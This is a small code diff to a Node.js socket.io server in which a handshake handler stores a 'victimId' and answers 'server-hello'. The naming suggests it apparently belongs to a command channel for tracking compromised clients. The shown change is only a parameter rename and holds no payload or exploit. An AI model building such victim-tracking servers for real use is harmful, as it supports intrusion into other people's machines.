@@ -19,8 +19,8 @@ socket.on('connection', function(client) {
     winston.info('New connection from client ' + client.id);
     
     var victimId;
-    client.on('client-hello', function({VICTIM_ID}) {
-        victimId = VICTIM_ID;
+    client.on('client-hello', function({victim_id}) {
+        victimId = victim_id;
         client.emit('server-hello');
     });
 
